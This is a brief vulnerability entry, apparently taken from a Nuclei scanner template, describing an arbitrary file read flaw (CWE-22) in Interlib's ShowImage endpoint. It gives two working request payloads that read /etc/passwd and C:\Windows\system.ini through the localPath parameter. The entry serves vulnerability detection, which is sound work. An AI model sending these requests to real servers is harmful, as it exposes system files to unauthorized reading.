# Vulnerability: Interlib - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`interlib-fileread.yaml`)

## Description
Interlib has an arbitrary file read vulnerability. Attackers can use the vulnerability to read any file.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/interlib/report/ShowImage?localPath=etc/passwd
GET {{BaseURL}}/interlib/report/ShowImage?localPath=C:\Windows\system.ini
```

